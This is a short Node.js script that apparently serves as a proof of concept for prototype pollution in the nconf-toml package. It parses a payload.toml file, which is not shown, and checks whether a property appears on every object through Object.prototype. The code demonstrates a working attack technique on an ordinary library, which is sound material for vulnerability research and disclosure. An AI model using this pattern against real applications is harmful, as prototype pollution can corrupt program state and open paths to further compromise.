var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const nt = require('nconf-toml');
const fs = require('fs');
const path = require('path');
nt.parse(fs.readFileSync(path.resolve(__dirname, './payload.toml'), 'utf-8'));
console.log({}.polluted);